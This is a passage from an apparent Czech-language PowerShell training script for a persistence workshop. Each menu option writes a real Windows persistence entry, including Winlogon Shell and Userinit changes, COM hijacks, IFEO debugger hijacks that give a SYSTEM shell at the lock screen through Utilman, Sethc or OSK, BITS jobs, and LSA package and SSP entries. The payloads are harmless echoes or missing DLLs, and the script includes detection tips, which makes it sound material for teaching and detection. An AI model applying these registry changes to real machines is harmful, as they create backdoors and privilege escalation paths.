            New-ItemProperty -Path $regPath -Name $valueName -Value $valueData -PropertyType String -Force | Out-Null
            Write-Host "Do registru byl pridan klic $valueName typu REG_SZ."
            Write-Host "Pridano: Screensaver nastaveni -> $regPath\\$valueName = $valueData" -ForegroundColor Green
            Write-Host "Kdy se spousti: kdyz se aktivuje screensaver (po urcitem case necinosti). Pouziti: spousteni kodu pri zamceni/bezci screensaver." -ForegroundColor Yellow
            Log-Action "Set screensaver SCRNSAVE.EXE -> $valueData"
        }
        13 {
            # Office Test persistence (MITRE ATT&CK T1137.002).
            # POZOR: Office test klic je DLL LOADER, ne exe launcher!
            # Office pri startu klasicke aplikace (Word/Excel/PowerPoint/Outlook/...) precte hodnotu (Default)
            # a pokusi se pres LoadLibrary() nacist DLL z te cesty (typicky ocekava export funkce 'Perf').
            # Pokud tam dame cmd.exe, LoadLibrary tise selze - proto se nic viditelneho nedeje.
            # Pro DEMO nastavime cestu k neexistujici DLL - persistence artefakt zustane v registru
            # a v Process Monitoru / Sysmon uvidis pokus o load (RegQueryValue + CreateFile na DLL cestu).
            Write-Host "Office Test: Zkontrolujte 'HKCU:\Software\Microsoft\Office test\Special\Perf'."
            $regPath = "HKCU:\Software\Microsoft\Office test\Special\Perf"
            $valueData = "C:\Windows\Temp\demo_office_test.dll"
            New-Item -Path $regPath -Force | Out-Null
            New-ItemProperty -Path $regPath -Name "(Default)" -Value $valueData -PropertyType String -Force | Out-Null
            Write-Host "Do registru byl pridan Office test klic (hodnota = cesta k neexistujici DLL, jen pro artefakt)."
            Write-Host "Pridano: Office test key -> $regPath (Default) = $valueData" -ForegroundColor Green
            Write-Host "Kdy se spousti: pri startu KLASICKE Office aplikace (Word/Excel/PowerPoint/Outlook/Access/Publisher/Visio/Project)." -ForegroundColor Yellow
            Write-Host "                Office zavola LoadLibrary(vyse uvedena cesta). Pokud DLL neexistuje - LoadLibrary selze, ale POKUS je viditelny v ProcMon/Sysmon EID 7." -ForegroundColor Yellow
            Write-Host "                Pokud DLL existuje a ma export 'Perf' - kod DLL se spusti pod uctem uzivatele s Office procesem." -ForegroundColor Yellow
            Write-Host "NEFUNGUJE u: Office Web, OneNote UWP, Teams, Office Mobile. Novejsi M365 CTR muze mit mitigace." -ForegroundColor Yellow
            Write-Host "TIP: pokud chces videt live 'projev' - otevri regedit na cestu vyse a pak spust Word. V ProcMon uvidis 'HKCU\...\Office test\Special\Perf' RegQuery a CreateFile na DLL." -ForegroundColor Cyan
            Log-Action "Created Office test registry key -> $regPath (Default) = $valueData (non-existent DLL for artifact-only demo)"
        }
        14 {
            # Winlogon Shell persistence modifies the shell that is executed at logon
            # This technique changes the shell from explorer.exe to include additional commands
            if (-not (Require-Administrator)) { break }
            Write-Host "Winlogon Shell: Zkontrolujte 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon'."
            $regPath = "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
            $valueName = "Shell"
            $valueData = "explorer.exe,cmd.exe"
            Set-ItemProperty -Path $regPath -Name $valueName -Value $valueData -Force | Out-Null
            Write-Host "Do registru byl pridan klic $valueName typu REG_SZ."
            Write-Host "Pridano: Winlogon Shell -> $regPath\\$valueName = $valueData" -ForegroundColor Green
            Write-Host "Kdy se spousti: pri prihlaseni uzivatele (prez start explorer.exe). Pouziti: modifikace prihlasovaciho shellu pro spousteni dalsich procesu." -ForegroundColor Yellow
            Log-Action "Set Winlogon Shell: $valueData"
        }
        15 {
            # RunOnce (HKCU) - runs once at next logon, then the value is deleted
            Write-Host "RunOnce klic v HKCU: Zkontrolujte 'HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce'."
            $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
            $valueName = "demoOnce"
            $valueData = 'cmd /k echo Me spousti RunOnce v HKCU - spusti se jednou pri dalsim prihlaseni a pak se automaticky smaze'
            if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
            New-ItemProperty -Path $regPath -Name $valueName -Value $valueData -PropertyType ExpandString -Force | Out-Null
            Write-Host "Do registru byl pridan klic $valueName typu REG_EXPAND_SZ."
            Write-Host "Pridano: HKCU RunOnce -> $regPath\$valueName = $valueData" -ForegroundColor Green
            Write-Host "Kdy se spousti: pri PRISTIM prihlaseni uzivatele - jednorazove, pak se hodnota v registru automaticky smaze." -ForegroundColor Yellow
            Write-Host "Pouziti: dokonceni instalace, druha faze payloadu, cleanup akce, migrace." -ForegroundColor Yellow
            Log-Action "Added HKCU RunOnce entry: $valueName -> $valueData"
        }
        16 {
            # RunOnce (HKLM) - system-wide, runs once at next logon of any user
            if (-not (Require-Administrator)) { break }
            Write-Host "RunOnce klic v HKLM: Zkontrolujte 'HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce'."
            $regPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
            $valueName = "demoOnce"
            $valueData = 'cmd /k echo Me spousti RunOnce v HKLM - spusti se jednou po pristim startu / prihlaseni a pak se automaticky smaze'
            if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
            New-ItemProperty -Path $regPath -Name $valueName -Value $valueData -PropertyType ExpandString -Force | Out-Null
            Write-Host "Do registru byl pridan klic $valueName typu REG_EXPAND_SZ do HKLM."
            Write-Host "Pridano: HKLM RunOnce -> $regPath\$valueName = $valueData" -ForegroundColor Green
            Write-Host "Kdy se spousti: pri PRISTIM prihlaseni jakehokoliv uzivatele - jednorazove system-wide." -ForegroundColor Yellow
            Write-Host "Pouziti: jednorazova akce po restartu (napr. dokonceni patche, instalace ovladace, atd.)." -ForegroundColor Yellow
            Log-Action "Added HKLM RunOnce entry: $valueName -> $valueData"
        }
        17 {
            # PowerShell Profile - executes at every PowerShell start (CurrentUser scope)
            $profilePath = $PROFILE.CurrentUserAllHosts
            Write-Host "PowerShell Profile (CurrentUser, AllHosts): $profilePath"
            $profileDir = Split-Path -Parent $profilePath
            if (-not (Test-Path $profileDir)) { New-Item -Path $profileDir -ItemType Directory -Force | Out-Null }
            $marker = '# DEMO_PERSISTENCE_MARKER'
            $line = 'Write-Host ("PS Profile persistence: spustena pod " + $env:USERNAME + " na " + $env:COMPUTERNAME) -ForegroundColor Magenta ' + $marker
            if (Test-Path $profilePath) {
                $existing = Get-Content $profilePath -Raw -ErrorAction SilentlyContinue
                if (-not $existing -or ($existing -notmatch [regex]::Escape($marker))) {
                    Add-Content -Path $profilePath -Value "`r`n$line" -Encoding UTF8
                }
            } else {
                Set-Content -Path $profilePath -Value $line -Encoding UTF8
            }
            Write-Host "Do PS profilu byl pridan radek s markerem $marker."
            Write-Host "Pridano: PowerShell profile -> $profilePath" -ForegroundColor Green
            Write-Host "Kdy se spousti: pri KAZDEM startu PowerShellu (konzole, ISE, VSCode terminal, ...) pod danym uzivatelem." -ForegroundColor Yellow
            Write-Host "Pouziti: uzivatelska persistence typicka pro red-team scenare - kazdy PowerShell = trigger." -ForegroundColor Yellow
            Log-Action "Appended demo line to PowerShell profile: $profilePath"
        }
        18 {
            # COM Hijacking - registrace uzivatelskeho CLSID, ktery presmeruje na cmd.exe.
            # V realnem utoku by se hijacknul EXISTUJICI CLSID pouzivany napr. explorer.exe nebo prohlizecem.
            Write-Host "COM Hijacking: HKCU:\Software\Classes\CLSID (per-user, bez admin)."
            $demoGuid = "{DEADBEEF-1234-5678-9ABC-DEF012345678}"
            $regPath = "HKCU:\Software\Classes\CLSID\$demoGuid\InprocServer32"
            if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
            New-ItemProperty -Path $regPath -Name "(Default)" -Value "C:\Windows\System32\cmd.exe" -PropertyType String -Force | Out-Null
            New-ItemProperty -Path $regPath -Name "ThreadingModel" -Value "Apartment" -PropertyType String -Force | Out-Null
            Write-Host "Do registru byl pridan CLSID $demoGuid."
            Write-Host "Pridano: COM Hijacking -> HKCU\Software\Classes\CLSID\$demoGuid\InprocServer32" -ForegroundColor Green
            Write-Host "Kdy se spousti: kdyz nejaky proces vytvori COM objekt s timto CLSID (v realu se hijackuje CLSID, ktery volaji explorer/office/browser)." -ForegroundColor Yellow
            Write-Host "Poznamka: v tomto demu jsou pouzity smyslene GUID a exe misto DLL - realny utok by hijacknul znamy CLSID a nahradil DLL." -ForegroundColor Yellow
            Log-Action "Added COM Hijack CLSID: $demoGuid -> cmd.exe"
        }
        19 {
            # Utilman / Sticky Keys hijack pres IFEO Debugger.
            # Umoznuje spustit cmd.exe (SYSTEM) primo z lock screenu pres Win+U nebo tlacitko Ease of Access.
            if (-not (Require-Administrator)) { break }
            Write-Host "Utilman / Sticky Keys hijack (IFEO Debugger)."
            Write-Host "POZOR: Tato technika umoznuje spustit cmd.exe pod SYSTEM PRIMO Z LOCK SCREENU (Win+U)!" -ForegroundColor Red
            Write-Host "V labu je to bezpecne demo - v produkci by slo o kriticky bypass a eskalaci privilegii." -ForegroundColor Red
            $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe"
            if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
            New-ItemProperty -Path $regPath -Name "Debugger" -Value "C:\Windows\System32\cmd.exe" -PropertyType String -Force | Out-Null
            Write-Host "Pridano: IFEO Debugger for utilman.exe -> $regPath\Debugger = cmd.exe" -ForegroundColor Green
            Write-Host "Kdy se spousti: pri kliknuti na 'Ease of Access' na lock screenu nebo stisknuti Win+U." -ForegroundColor Yellow
            Write-Host "Pouziti: pre-logon persistence + SYSTEM shell z lock screenu (klasicky post-exploitation krok)." -ForegroundColor Yellow
            Log-Action "Added IFEO Debugger for utilman.exe -> cmd.exe (Sticky Keys / Utilman hijack)"
        }
        20 {
            # Netsh Helper DLL - kazde spusteni netsh.exe nacte registrovane helper DLL.
            # V demu registrujeme neexistujici DLL - klic ale zustane v registru pro detekci.
            if (-not (Require-Administrator)) { break }
            Write-Host "Netsh Helper DLL: 'HKLM:\SOFTWARE\Microsoft\Netsh'."
            $regPath = "HKLM:\SOFTWARE\Microsoft\Netsh"
            $valueName = "demo"
            $valueData = "C:\Windows\System32\demo_helper.dll"
            New-ItemProperty -Path $regPath -Name $valueName -Value $valueData -PropertyType String -Force | Out-Null
            Write-Host "Do registru byl pridan zaznam netsh helperu (DLL zamerne neexistuje - jen registrace pro detekci)."
            Write-Host "Pridano: Netsh Helper -> $regPath\$valueName = $valueData" -ForegroundColor Green
            Write-Host "Kdy se spousti: pri kazdem spusteni 'netsh.exe' (mnoho spravcovskych a monitorovacich skriptu jej pouziva)." -ForegroundColor Yellow
            Write-Host "Pouziti: DLL load pri pouziti netsh - dokumentovana APT persistence (napr. Turla)." -ForegroundColor Yellow
            Log-Action "Added Netsh helper registration: $valueName -> $valueData (DLL neexistuje - demo)"
        }
        21 {
            # BITS Job - Background Intelligent Transfer Service umoznuje spustit prikaz pri zmene stavu jobu.
            # BITS prezije reboot a pravidelne se pokousi o resume - z toho vznika persistence.
            Write-Host "BITS Job: vytvarim BITS job s SetNotifyCmdLine."
            try {
                $jobName = "DemoBitsJob"
                # remove existing job with same name if exists
                & bitsadmin /cancel $jobName 2>$null | Out-Null
                & bitsadmin /create $jobName | Out-Null
                & bitsadmin /addfile $jobName "https://example.com/dummy.txt" "$env:TEMP\dummy_bits.txt" | Out-Null
                & bitsadmin /SetNotifyCmdLine $jobName "cmd.exe" "/k echo Me spustila BITS job notifikace na PC %COMPUTERNAME%" | Out-Null
                & bitsadmin /SetMinRetryDelay $jobName 60 | Out-Null
                & bitsadmin /resume $jobName | Out-Null
                Write-Host "Pridano: BITS job '$jobName' s notify cmd.exe /k echo ..." -ForegroundColor Green
                Write-Host "Kdy se spousti: pri zmene stavu jobu (uspech nebo chyba prenosu). BITS umi resume po restartu -> persistence prezije reboot." -ForegroundColor Yellow
                Write-Host "Pouziti: skryta persistence pouzivajici legitimni Windows sluzbu (Background Intelligent Transfer)." -ForegroundColor Yellow
                Log-Action "Created BITS job: $jobName with SetNotifyCmdLine"
            } catch {
                Write-Host "Chyba pri vytvareni BITS jobu: $_" -ForegroundColor Red
                Log-Action "ERROR creating BITS job: $_"
            }
        }
        22 {
            # Winlogon Userinit - hodnota, ktera se spousti hned po prihlaseni jako prvni.
            # POZOR na spravnou syntaxi vcetne koncove carky - jinak se muze prihlaseni rozbit.
            if (-not (Require-Administrator)) { break }
            Write-Host "Winlogon Userinit: 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon'."
            Write-Host "POZOR: Zmena Userinit muze rozbit prihlaseni! Format vyzaduje presnou syntaxi vcetne koncove carky." -ForegroundColor Red
            $regPath = "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
            $valueName = "Userinit"
            $valueData = "C:\Windows\system32\userinit.exe,C:\Windows\System32\cmd.exe,"
            Set-ItemProperty -Path $regPath -Name $valueName -Value $valueData -Force | Out-Null
            Write-Host "Do registru byl pridan klic $valueName typu REG_SZ."
            Write-Host "Pridano: Winlogon Userinit -> $regPath\$valueName = $valueData" -ForegroundColor Green
            Write-Host "Kdy se spousti: hned po prihlaseni uzivatele, PRED spustenim explorer.exe (via Shell)." -ForegroundColor Yellow
            Write-Host "Pouziti: velmi rana persistence pri logonu - bezi drive nez vetsina EDR/AV hooku uzivatelske relace." -ForegroundColor Yellow
            Log-Action "Set Winlogon Userinit: $valueData"
        }
        23 {
            # Scheduled Task s netradicnim triggerem SESSION_STATE_CHANGE (zamknuti obrazovky).
            # DEMO pro workshop: skolitel spusti tuto volbu, stiskne Win+L a po odemknuti se objevi cmd.exe.
            Write-Host "Planovana uloha spustena pri ZAMKNUTI OBRAZOVKY (SESSION_LOCK)."
            Write-Host "Po dokonceni stisknte Win+L. Po odemknuti se objevi viditelne okno cmd.exe." -ForegroundColor Magenta
            try {
                $taskName = "DemoLockScreenTask"
                # remove existing task with same name if exists
                Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue

                $svc = New-Object -ComObject Schedule.Service
                $svc.Connect()
                $folder = $svc.GetFolder("\")
                $td = $svc.NewTask(0)

                $td.RegistrationInfo.Description = "Demo persistence spoustena pri zamknuti obrazovky - Hack3r.cz workshop"
                $td.Settings.Enabled = $true
                $td.Settings.Hidden = $false
                $td.Settings.DisallowStartIfOnBatteries = $false
                $td.Settings.StopIfGoingOnBatteries = $false
                $td.Settings.AllowDemandStart = $true

                # Trigger typ 11 = TASK_TRIGGER_SESSION_STATE_CHANGE
                # StateChange 7 = TASK_SESSION_LOCK (dalsi hodnoty: 8 = UNLOCK, 4/5 = CONSOLE CONNECT/DISCONNECT)
                $trigger = $td.Triggers.Create(11)
                $trigger.StateChange = 7
                $trigger.UserId = "$env:USERDOMAIN\$env:USERNAME"
                $trigger.Enabled = $true

                # Action: cmd.exe /k echo (viditelne okno)
                $action = $td.Actions.Create(0)
                $action.Path = "cmd.exe"
                $action.Arguments = "/k echo Persistence spustena pri zamknuti obrazovky! Uzivatel: %USERNAME%  PC: %COMPUTERNAME%"

                # Principal: INTERACTIVE_TOKEN (3) - okno bude viditelne pro prihlaseneho uzivatele
                $td.Principal.LogonType = 3
                $td.Principal.RunLevel = 0  # LUA (bez elevace)

                # RegisterTaskDefinition: TASK_CREATE_OR_UPDATE = 6, logonType 3 = INTERACTIVE_TOKEN
                $folder.RegisterTaskDefinition($taskName, $td, 6, $null, $null, 3) | Out-Null

                Write-Host "Pridano: Scheduled Task '$taskName' s triggerem SESSION_LOCK a viditelnym cmd.exe." -ForegroundColor Green
                Write-Host "Kdy se spousti: kdykoliv uzivatel zamkne obrazovku (Win+L)." -ForegroundColor Yellow
                Write-Host "Pouziti: netradicni event-based trigger - baseline sken pri startu ho neodhali, protoze uloha nema logon/boot trigger." -ForegroundColor Yellow
                Write-Host "TIP pro skolitele: stisknte ted Win+L, prihlaste se zpet a objevi se okno cmd.exe." -ForegroundColor Magenta
                Log-Action "Registered scheduled task: $taskName; Trigger=SESSION_LOCK (StateChange=7)"
            } catch {
                Write-Host "Chyba pri vytvareni ulohy: $_" -ForegroundColor Red
                Log-Action "ERROR creating DemoLockScreenTask: $_"
            }
        }
        24 {
            # Active Setup (T1547.014) - HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{GUID}
            # Spousti se jednou per uzivatel pri jeho prvnim prihlaseni, kdyz HKCU verze neexistuje nebo je nizsi
            if (-not (Require-Administrator)) { break }
            Write-Host "Active Setup: 'HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components'."
            $demoGuid = "{FEEDFACE-1234-5678-9ABC-DEF012345678}"
            $regPath = "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\$demoGuid"
            if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
            New-ItemProperty -Path $regPath -Name "(Default)" -Value "Demo Active Setup" -PropertyType String -Force | Out-Null
            New-ItemProperty -Path $regPath -Name "StubPath" -Value 'cmd.exe /k echo Active Setup persistence spustena pro %USERNAME% na %COMPUTERNAME%' -PropertyType String -Force | Out-Null
            New-ItemProperty -Path $regPath -Name "Version" -Value "1,0,0,0" -PropertyType String -Force | Out-Null
            New-ItemProperty -Path $regPath -Name "IsInstalled" -Value 1 -PropertyType DWord -Force | Out-Null
            Write-Host "Pridano: Active Setup component $demoGuid -> StubPath = cmd.exe" -ForegroundColor Green
            Write-Host "Kdy se spousti: pri PRVNIM prihlaseni kazdeho uzivatele (Windows porovna HKCU\Active Setup verzi s HKLM a spusti StubPath)." -ForegroundColor Yellow
            Write-Host "Pouziti: system-wide 'first-run per user' - klasicky trick MSI installeru i utocniku (kazdy novy user bude retriggered)." -ForegroundColor Yellow
            Log-Action "Added Active Setup component: $demoGuid -> StubPath cmd.exe"
        }
        25 {
            # AppCertDLLs (T1546.009) - HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDlls
            # Nacita se do KAZDEHO procesu, ktery vola CreateProcess (system-wide DLL injection)
            if (-not (Require-Administrator)) { break }
            Write-Host "AppCertDLLs: 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDlls'."
            $regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDlls"
            if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
            New-ItemProperty -Path $regPath -Name "demo" -Value "C:\Windows\Temp\demo_appcert.dll" -PropertyType String -Force | Out-Null
            Write-Host "Pridano: AppCertDLLs -> $regPath\demo = C:\Windows\Temp\demo_appcert.dll (DLL zamerne neexistuje, jen artefakt)" -ForegroundColor Green
            Write-Host "Kdy se spousti: pri kazdem volani CreateProcess (system-wide, drive nez proces zacne bezet)." -ForegroundColor Yellow
            Write-Host "Pouziti: sourozenec AppInit_DLLs, ale jinym loader mechanism - obcas obchazi mitigace pro AppInit." -ForegroundColor Yellow
            Log-Action "Added AppCertDLLs entry: demo -> C:\Windows\Temp\demo_appcert.dll"
        }
        26 {
            # Port Monitor (T1547.010) - HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\<name>\Driver
            # DLL nacitana spoolsv.exe (SYSTEM) pri startu Print Spooler sluzby
            if (-not (Require-Administrator)) { break }
            Write-Host "Print Port Monitor: 'HKLM:\SYSTEM\CurrentControlSet\Control\Print\Monitors'."
            $regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Print\Monitors\DemoMonitor"
            if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
            New-ItemProperty -Path $regPath -Name "Driver" -Value "demo_printmon.dll" -PropertyType String -Force | Out-Null
            Write-Host "Pridano: Print Monitor 'DemoMonitor' -> Driver = demo_printmon.dll (DLL zamerne neexistuje)" -ForegroundColor Green
            Write-Host "Kdy se spousti: pri startu Print Spooler sluzby (spoolsv.exe pod SYSTEM) - typicky pri bootu." -ForegroundColor Yellow
            Write-Host "Pouziti: SYSTEM-level persistence pres Print Spooler - dokumentovana v APT reportech (FIN7, APT34, Turla)." -ForegroundColor Yellow
            Log-Action "Added Port Monitor: DemoMonitor -> demo_printmon.dll"
        }
        27 {
            # Time Provider (T1547.003) - HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders
            # DLL nacitana W32Time sluzbou (svchost.exe pod LOCAL SERVICE)
            if (-not (Require-Administrator)) { break }
            Write-Host "Time Provider: 'HKLM:\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders'."
            $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\DemoProvider"
            if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
            New-ItemProperty -Path $regPath -Name "DllName" -Value "C:\Windows\Temp\demo_timeprov.dll" -PropertyType ExpandString -Force | Out-Null
            New-ItemProperty -Path $regPath -Name "Enabled" -Value 1 -PropertyType DWord -Force | Out-Null
            New-ItemProperty -Path $regPath -Name "InputProvider" -Value 1 -PropertyType DWord -Force | Out-Null
            Write-Host "Pridano: Time Provider 'DemoProvider' -> DllName = demo_timeprov.dll (DLL zamerne neexistuje)" -ForegroundColor Green
            Write-Host "Kdy se spousti: pri startu Windows Time sluzby (W32Time) - typicky pri bootu." -ForegroundColor Yellow
            Write-Host "Pouziti: perzistence pres casovou synchronizaci - malokdo tuto sekci registru kontroluje." -ForegroundColor Yellow
            Log-Action "Added Time Provider: DemoProvider -> demo_timeprov.dll"
        }
        28 {
            # Security Support Provider (SSP) - HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages
            # POZOR: uprava LSA konfigurace muze mit dopad na autentizaci. Skript pouze APPENDNE neexistujici nazev.
            # LSA se ho pokusi nacist, zaloguje chybu do System logu a pokracuje - nebootovaci system to nezpusobi.
            if (-not (Require-Administrator)) { break }
            Write-Host "Security Support Provider (SSP): 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'."
            Write-Host "POZOR: Uprava SSP kluce se dotyka LSA. Pridavame neexistujici nazev - LSA ho preskoci a jen zaloguje warning." -ForegroundColor Red
            $regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
            try {
                $current = (Get-ItemProperty -Path $regPath -Name "Security Packages" -ErrorAction SilentlyContinue)."Security Packages"
                if (-not $current) { $current = @() }
                if ($current -notcontains "demo_ssp") {
                    $new = @($current) + "demo_ssp"
                    Set-ItemProperty -Path $regPath -Name "Security Packages" -Value $new -Force | Out-Null
                }
                Write-Host "Pridano: 'demo_ssp' do MULTI_SZ hodnoty 'Security Packages'." -ForegroundColor Green
                Write-Host "Kdy se spousti: pri startu systemu - LSASS se pokusi nacist demo_ssp.dll (neexistuje -> log warning)." -ForegroundColor Yellow
                Write-Host "Pouziti: SYSTEM-level persistence s pristupem k LSASS pameti - potencialne credential dump (Mimikatz-style memssp)." -ForegroundColor Yellow
                Write-Host "Detekce: Event ID 6155 v System logu, nebo primo hodnota Security Packages v registru." -ForegroundColor Yellow
                Log-Action "Appended 'demo_ssp' to LSA Security Packages"
            } catch {
                Write-Host "Chyba pri uprave SSP: $_" -ForegroundColor Red
                Log-Action "ERROR modifying SSP: $_"
            }
        }
        29 {
            # Silent Process Exit (SPE) - HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\<exe>
            # Spusti prikaz kdyz cilovy proces UKONCI (opak IFEO Debugger - ten spousti pri STARTU).
            # DEMO 2: otevrete notepad, zavrete ho - vyskoci cmd.exe.
            if (-not (Require-Administrator)) { break }
            Write-Host "Silent Process Exit (SPE) - trigger PRI UKONCENI procesu (opak IFEO Debugger)." -ForegroundColor Magenta
            $target = "notepad.exe"
            $ifeoPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$target"
            $spePath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\$target"
            if (-not (Test-Path $ifeoPath)) { New-Item -Path $ifeoPath -Force | Out-Null }
            if (-not (Test-Path $spePath)) { New-Item -Path $spePath -Force | Out-Null }
            New-ItemProperty -Path $ifeoPath -Name "GlobalFlag" -Value 0x200 -PropertyType DWord -Force | Out-Null
            New-ItemProperty -Path $spePath -Name "ReportingMode" -Value 1 -PropertyType DWord -Force | Out-Null
            New-ItemProperty -Path $spePath -Name "MonitorProcess" -Value 'cmd.exe /k echo Silent Process Exit spustena po zavreni notepadu na %COMPUTERNAME%' -PropertyType String -Force | Out-Null
            Write-Host "Pridano: SPE hook pro '$target' -> pri jeho ukonceni se spusti cmd.exe." -ForegroundColor Green
            Write-Host "Kdy se spousti: pri UKONCENI cilovyho procesu (notepad.exe)." -ForegroundColor Yellow
            Write-Host "Pouziti: netradicni trigger - reakce na ZAVRENI programu, ne jeho spusteni." -ForegroundColor Yellow
            Write-Host "TIP pro skolitele: otevrete notepad.exe, zavrete ho krizkem - okamzite vyskoci cmd.exe." -ForegroundColor Magenta
            Log-Action "Added Silent Process Exit hook for notepad.exe -> cmd.exe"
        }
        30 {
            # File Association Hijack (T1546.001) - HKCU\Software\Classes
            # V DEMU vytvarime NOVOU priponu .demopers (nehijackujeme existujici .txt/.pdf, aby to bylo bezpecne).
            # Realny utok by nahradil handler existujici pripony.
            Write-Host "File Association Hijack: HKCU:\Software\Classes (per-user, bez admin)."
            $extPath = "HKCU:\Software\Classes\.demopers"
            $progIdPath = "HKCU:\Software\Classes\demopers.file\shell\open\command"
            if (-not (Test-Path $extPath)) { New-Item -Path $extPath -Force | Out-Null }
            New-ItemProperty -Path $extPath -Name "(Default)" -Value "demopers.file" -PropertyType String -Force | Out-Null
            if (-not (Test-Path $progIdPath)) { New-Item -Path $progIdPath -Force | Out-Null }
            New-ItemProperty -Path $progIdPath -Name "(Default)" -Value 'cmd.exe /k echo File association handler spustena! Argument: "%1"' -PropertyType String -Force | Out-Null
            $testFile = Join-Path $env:TEMP "test.demopers"
            "Testovaci soubor pro demonstraci File Association Hijack (Hack3r.cz workshop)." | Set-Content -Path $testFile -Encoding UTF8
            Write-Host "Pridano: .demopers -> demopers.file\shell\open\command = cmd.exe" -ForegroundColor Green
            Write-Host "Vytvoreno: testovaci soubor $testFile" -ForegroundColor Green
            Write-Host "Kdy se spousti: kdyz uzivatel otevre soubor s priponou .demopers (dvojklik v Exploreru)." -ForegroundColor Yellow
            Write-Host "Pouziti: v realu se hijackuje EXISTUJICI handler (napr. .txt, .pdf, .rdp) - my zde vytvarime novou priponu, aby to bylo bezpecne pro lab." -ForegroundColor Yellow
            Write-Host "TIP: otevrete '$testFile' dvojklikem v Exploreru - spusti se cmd.exe s cestou k souboru jako argument." -ForegroundColor Cyan
            Log-Action "Added file association hijack for .demopers -> cmd.exe; test file: $testFile"
        }
        31 {
            # sethc.exe Hijack (Sticky Keys) - IFEO Debugger method
            # 5x Shift na lock screenu spusti cmd.exe pod SYSTEM
            if (-not (Require-Administrator)) { break }
            Write-Host "Sethc.exe Hijack (Sticky Keys - 5x Shift)."
            Write-Host "POZOR: Umoznuje spustit cmd.exe pod SYSTEM z lock screenu stisknutim 5x Shift!" -ForegroundColor Red
            $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
            if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
            New-ItemProperty -Path $regPath -Name "Debugger" -Value "C:\Windows\System32\cmd.exe" -PropertyType String -Force | Out-Null
            Write-Host "Pridano: IFEO Debugger for sethc.exe -> cmd.exe" -ForegroundColor Green
            Write-Host "Kdy se spousti: pri stisknuti 5x Shift (Sticky Keys prompt) - funguje i na lock screenu!" -ForegroundColor Yellow
            Write-Host "Pouziti: klasicka post-exploitation technika - SYSTEM shell z lock screenu bez prihlaseni." -ForegroundColor Yellow
            Write-Host "TIP: Stisknte 5x Shift na lock screenu - objevi se cmd.exe pod SYSTEM uctem." -ForegroundColor Cyan
            Log-Action "Added IFEO Debugger for sethc.exe -> cmd.exe (Sticky Keys hijack)"
        }
        32 {
            # osk.exe Hijack (On-Screen Keyboard) - IFEO Debugger method
            if (-not (Require-Administrator)) { break }
            Write-Host "OSK.exe Hijack (On-Screen Keyboard)."
            Write-Host "POZOR: Umoznuje spustit cmd.exe pod SYSTEM z lock screenu pres Ease of Access -> OSK!" -ForegroundColor Red
            $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe"
            if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
            New-ItemProperty -Path $regPath -Name "Debugger" -Value "C:\Windows\System32\cmd.exe" -PropertyType String -Force | Out-Null
            Write-Host "Pridano: IFEO Debugger for osk.exe -> cmd.exe" -ForegroundColor Green
            Write-Host "Kdy se spousti: pri kliknuti na On-Screen Keyboard (OSK) na lock screenu." -ForegroundColor Yellow
            Write-Host "Pouziti: alternativa k Utilman/Sethc - mene caste monitorovana accessibility feature." -ForegroundColor Yellow
            Log-Action "Added IFEO Debugger for osk.exe -> cmd.exe (On-Screen Keyboard hijack)"
        }
        33 {
            # LSA Authentication Package - credential harvesting persistence
            if (-not (Require-Administrator)) { break }
            Write-Host "LSA Authentication Package."
            Write-Host "POZOR: Uprava Authentication Packages je VELMI RIZIKOVA - muze rozbit autentizaci systemu!" -ForegroundColor Red
            Write-Host "Demo pouze prida neexistujici nazev - LSASS ho preskoci a zaloguje warning." -ForegroundColor Yellow
            $regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
            try {
                $current = (Get-ItemProperty -Path $regPath -Name "Authentication Packages" -ErrorAction SilentlyContinue)."Authentication Packages"
                if (-not $current) { $current = @() }
                if ($current -notcontains "demo_auth") {
                    $new = @($current) + "demo_auth"
                    Set-ItemProperty -Path $regPath -Name "Authentication Packages" -Value $new -Force | Out-Null
